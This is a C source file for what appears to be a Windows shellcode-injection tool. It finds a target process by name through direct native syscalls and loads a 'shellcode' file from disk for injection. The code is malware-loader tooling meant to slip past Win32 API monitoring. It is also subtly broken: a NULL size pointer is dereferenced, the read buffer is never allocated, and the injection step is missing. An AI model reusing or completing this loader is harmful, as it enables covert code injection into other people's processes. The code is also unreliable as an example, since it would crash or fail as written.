# define _CRT_SECURE_NO_WARNINGS
# include "custom-syscall-stub.h"
# include "injection.h"
# include <windows.h>

#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define BUFFER_SIZE 0x40000

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;                     // Offset to the next entry, or 0 if this is the last entry
    ULONG NumberOfThreads;                     // Number of threads in the process
    LARGE_INTEGER WorkingSetPrivateSize;       // Private working set size
    ULONG HardFaultCount;                      // Hard page faults
    ULONG NumberOfThreadsHighWatermark;        // Peak thread count
    ULONGLONG CycleTime;                       // Total process cycle time
    LARGE_INTEGER CreateTime;                  // Process creation time
    LARGE_INTEGER UserTime;                    // Time spent in user mode
    LARGE_INTEGER KernelTime;                  // Time spent in kernel mode
    UNICODE_STRING ImageFileName;              // Process name
    HANDLE UniqueProcessId;                    // Process ID
    HANDLE InheritedFromUniqueProcessId;       // Parent Process ID
    ULONG HandleCount;                         // Number of handles
    ULONG SessionId;                           // Session ID
    ULONG_PTR UniqueProcessKey;                // Unique key for the process
    SIZE_T PeakVirtualSize;                    // Peak virtual memory usage
    SIZE_T VirtualSize;                        // Current virtual memory usage
    ULONG PageFaultCount;                      // Total page faults
    SIZE_T PeakWorkingSetSize;                 // Peak working set size
    SIZE_T WorkingSetSize;                     // Current working set size
    SIZE_T QuotaPeakPagedPoolUsage;            // Peak paged pool usage
    SIZE_T QuotaPagedPoolUsage;                // Current paged pool usage
    SIZE_T QuotaPeakNonPagedPoolUsage;         // Peak non-paged pool usage
    SIZE_T QuotaNonPagedPoolUsage;             // Current non-paged pool usage
    SIZE_T PagefileUsage;                      // Current pagefile usage
    SIZE_T PeakPagefileUsage;                  // Peak pagefile usage
    SIZE_T PrivatePageCount;                   // Private memory usage
    LARGE_INTEGER ReadOperationCount;          // I/O read operations
    LARGE_INTEGER WriteOperationCount;         // I/O write operations
    LARGE_INTEGER OtherOperationCount;         // Other I/O operations
    LARGE_INTEGER ReadTransferCount;           // I/O bytes read
    LARGE_INTEGER WriteTransferCount;          // I/O bytes written
    LARGE_INTEGER OtherTransferCount;          // Other I/O bytes transferred
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

void RtlInitUnicodeString(PUNICODE_STRING DestinationString, wchar_t* SourceString) {
    //if (DestinationString == NULL) return;

    if (SourceString) {
        SIZE_T length = wcslen(SourceString) * sizeof(WCHAR); // Allocating memory for the string
        DestinationString->Buffer = (PWSTR)SourceString;
        DestinationString->Length = (USHORT)length; // Size of string in "BYTES"
        DestinationString->MaximumLength = (USHORT)(length + sizeof(WCHAR));
    }
    else {
        DestinationString->Buffer = NULL;
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
    }
}

#ifndef FILE_STANDARD_INFORMATION
typedef struct _FILE_STANDARD_INFORMATION {
    LARGE_INTEGER   AllocationSize;
    LARGE_INTEGER   EndOfFile;
    ULONG           NumberOfLinks;
    BOOLEAN         DeletePending;
    BOOLEAN         Directory;
} FILE_STANDARD_INFORMATION;
#endif

ULONG_PTR findHandle(char* procName) {
    void* buffer = NULL;
    size_t bufferSize = BUFFER_SIZE;
    ULONG returnLength = 0;

    // Converting char ptr to wchar_t
    wchar_t widecharProcName[35];
    int length = MultiByteToWideChar(CP_ACP, 0, procName, -1, NULL, 0);
    if (length == 0) {
        yapBad("Failed to convert process name to wide character string.");
        return -1; // Return an error code
    }
    MultiByteToWideChar(CP_ACP, 0, procName, -1, widecharProcName, length);

    NTSTATUS status = NtAllocateVirtualMemory((HANDLE)-1, &buffer, 0, &bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        yapBad("Failed to allocate memory for process information structure. Status: 0x% 08X", status);
        return -1;
    }
    yapOkay("Allocated memory at [0x%p] for the process information structure", buffer);

    status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);
    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        NtFreeVirtualMemory((HANDLE)-1, &buffer, &bufferSize, MEM_RELEASE); // Free previous memory
        bufferSize = returnLength;
        status = NtAllocateVirtualMemory((HANDLE)-1, &buffer, 0, &bufferSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
        if (!NT_SUCCESS(status)) {
            yapBad("Failed to reallocate memory. Status: 0x%08X", status);
            return -1;
        }
        status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);
    }
    if (!NT_SUCCESS(status)) {
        yapBad("Failed to query system process information. Status: 0x%08X", status);
        NtFreeVirtualMemory((HANDLE)-1, &buffer, &bufferSize, MEM_RELEASE);
        return -1;
    }

    SYSTEM_PROCESS_INFORMATION* currentProcess = (SYSTEM_PROCESS_INFORMATION*)buffer;
    ULONG_PTR pHandle = 0;

    printf("\n");
    while (currentProcess) {
        if (currentProcess->ImageFileName.Length > 0 && currentProcess->ImageFileName.Buffer && widecharProcName) {
            wchar_t wcharProcNameFromStruct[MAX_PATH] = { 0 };
            wcsncpy_s(wcharProcNameFromStruct, MAX_PATH, currentProcess->ImageFileName.Buffer, currentProcess->ImageFileName.Length / sizeof(wchar_t));
            wcharProcNameFromStruct[MAX_PATH - 1] = L'\0'; // Null termination

            // Debugging info
            yapInfo("CurrentProcess: %p, Process name: %ws, NextEntryOffset: %lu", currentProcess, wcharProcNameFromStruct, currentProcess->NextEntryOffset);

            // Process name comparison
            if (_wcsicmp(wcharProcNameFromStruct, widecharProcName) == 0) {
                printf("\n");
                pHandle = (ULONG_PTR)currentProcess->UniqueProcessId;
                yapOkay("Found process: %ws (Process Handle: 0x%p)", wcharProcNameFromStruct, pHandle);
                return pHandle;
            }
        }
        else {
            yapBad("Skipping process: ImageFileName.Buffer is NULL or invalid");
        }

        if (currentProcess->NextEntryOffset == 0) break;

        currentProcess = (SYSTEM_PROCESS_INFORMATION*)((char*)currentProcess + currentProcess->NextEntryOffset);
    }
    printf("\n");

    yapBad("Process %ws not found", widecharProcName);
    return EXIT_FAILURE;
}

BOOL ShellcodeInjection(ULONG_PTR pHandle, char* filename) {
    HANDLE hFILE = INVALID_HANDLE_VALUE;
    SIZE_T *shellcodeSize = NULL;

    // Loading file into buffer
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uFilename;
    IO_STATUS_BLOCK ioStatusBlock;
    LARGE_INTEGER fileSize = { 0 };
    void* shellcodeBuffer = NULL;

    // Convert to wide char
    wchar_t widecharFilename[MAX_PATH];

    int len = MultiByteToWideChar(CP_ACP, 0, filename, -1, widecharFilename, MAX_PATH);
 
    wprintf(L"['-'] Wide Filename: '%ls'\n", widecharFilename);
 
    RtlInitUnicodeString(&uFilename, widecharFilename);
    InitializeObjectAttributes(&objAttr, &uFilename, OBJ_CASE_INSENSITIVE, NULL, NULL);
    NTSTATUS status = NtOpenFile(&hFILE, GENERIC_READ | SYNCHRONIZE, &objAttr, &ioStatusBlock, FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
    if (!NT_SUCCESS(status)) {
        yapBad("Error: NtOpenFile failed with status 0x%X", status);
        return FALSE;
    }
    yapOkay("File opened successfully");

    FILE_STANDARD_INFORMATION fileInfo;
    status = NtQueryInformationFile(hFILE, &ioStatusBlock, &fileInfo, sizeof(fileInfo), FileStandardInformation);
    if (!NT_SUCCESS(status)) {
        printf("Error: NtQueryInformationFile failed with status 0x%X", status);
        NtClose(hFILE);
        return FALSE;
    }
    fileSize = fileInfo.EndOfFile;
    *shellcodeSize = fileSize.QuadPart;
    
    // Copy the shellcode into the buffer
    status = NtReadFile(hFILE, NULL, NULL, NULL, &ioStatusBlock, shellcodeBuffer, (ULONG)*shellcodeSize, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        yapBad("Error: NtReadFile failed with status 0x%X", status);
        NtClose(hFILE);
        return FALSE;
    }

    yapOkay("Shellcode successfully loaded into memory");

    return TRUE;
}
